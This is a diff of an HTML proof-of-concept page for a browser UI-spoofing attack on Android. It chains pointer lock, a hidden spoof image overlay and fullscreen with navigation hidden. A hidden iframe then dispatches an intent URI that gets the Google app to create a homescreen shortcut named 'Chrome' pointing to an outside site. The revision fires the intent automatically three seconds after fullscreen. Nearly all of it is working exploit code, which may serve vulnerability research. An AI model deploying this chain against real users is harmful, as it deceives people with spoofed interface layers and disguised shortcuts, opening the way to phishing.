@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
-    <title>Ultimate Chaining & Intent Spoof PoC</title>
+    <title>Fullscreen First & Delayed Intent PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -92,7 +92,7 @@
       <img id="spoof" style="display: none;" src="spoof.png" alt="Spoof Layer">
 
       <div class="container" id="mainContainer">
-        <button id="execBtn">INITIALIZE INTENT & CHAINING</button>
+        <button id="execBtn">INITIALIZE FULLSCREEN & INTENT</button>
         <div class="info" id="statusInfo">Status: Ready for interaction.</div>
       </div>
     </div>
@@ -102,63 +102,61 @@
       let statusInfo = document.getElementById("statusInfo");
 
       execButton.onclick = async function () {
-        statusInfo.innerText = "Status: Executing intent & security context chaining...";
+        statusInfo.innerText = "Status: Entering Fullscreen mode...";
         this.style.display = "none";
 
         try {
-          // 1. Chaining Step 1: Pointer Lock Activation
+          // 1. Pointer Lock & Overlay/UI Prep
           let plElement = document.getElementById("pointerLockElement");
           if (plElement && plElement.requestPointerLock) {
             await plElement.requestPointerLock().catch((err) => {
-              console.debug("PointerLock chained catch:", err.message);
+              console.debug("PointerLock catch:", err.message);
             });
           }
 
-          // 2. Chaining Step 2: Intent URI Dispatcher (Menggunakan payload Android Intent NDevTK)
-          let spoofFrame = document.createElement("iframe");
-          spoofFrame.style.display = "none";
-          spoofFrame.src = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
-          document.body.appendChild(spoofFrame);
-
-          // 3. Chaining Step 3: Instan menampilkan visual overlay spoof.png di atas konteks dialog
           let spoofImg = document.getElementById("spoof");
           if (spoofImg) {
             spoofImg.style.display = "block";
           }
 
-          statusInfo.innerText = "Status: Overlay deployed. Engaging chained Fullscreen lock...";
+          // 2. Eksekusi Fullscreen terlebih dahulu secara instan
+          let fsElement = document.getElementById("fullscreenElement") || document.documentElement;
+          let requestFS = fsElement.requestFullscreen || 
+                          fsElement.webkitRequestFullscreen || 
+                          fsElement.mozRequestFullScreen || 
+                          fsElement.msRequestFullscreen;
 
-          // 4. Chaining Step 4: Eksekusi Fullscreen dengan jeda mikro yang dioptimalkan
-          setTimeout(async () => {
-            let fsElement = document.getElementById("fullscreenElement") || document.documentElement;
-
-            let requestFS = fsElement.requestFullscreen || 
-                            fsElement.webkitRequestFullscreen || 
-                            fsElement.mozRequestFullScreen || 
-                            fsElement.msRequestFullscreen;
-
-            if (requestFS) {
+          if (requestFS) {
+            try {
+              await requestFS.call(fsElement, { navigationUI: "hide" });
+            } catch (err) {
               try {
-                await requestFS.call(fsElement, { navigationUI: "hide" });
-              } catch (err) {
-                try {
-                  await requestFS.call(fsElement);
-                } catch (e) {
-                  console.debug("Fullscreen chain fallback error:", e.message);
-                }
+                await requestFS.call(fsElement);
+              } catch (e) {
+                console.debug("Fullscreen fallback error:", e.message);
               }
             }
+          }
 
-            let container = document.getElementById("mainContainer");
-            if (container) {
-              container.style.display = "none";
-            }
+          let container = document.getElementById("mainContainer");
+          if (container) {
+            container.style.display = "none";
+          }
 
-            statusInfo.innerText = "Status: Full chaining active with Android intent dispatch.";
-          }, 300);
+          statusInfo.innerText = "Status: Fullscreen active. Intent will trigger in 3 seconds...";
+
+          // 3. Intent berjalan otomatis setelah jeda waktu 3 detik (3000ms)
+          setTimeout(() => {
+            statusInfo.innerText = "Status: Dispatching Android Intent payload...";
+            
+            let spoofFrame = document.createElement("iframe");
+            spoofFrame.style.display = "none";
+            spoofFrame.src = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
+            document.body.appendChild(spoofFrame);
+          }, 3000);
 
         } catch (err) {
-          statusInfo.innerText = "Status: Chaining execution error: " + err.message;
+          statusInfo.innerText = "Status: Execution error: " + err.message;
           execButton.style.display = "block";
         }
       };
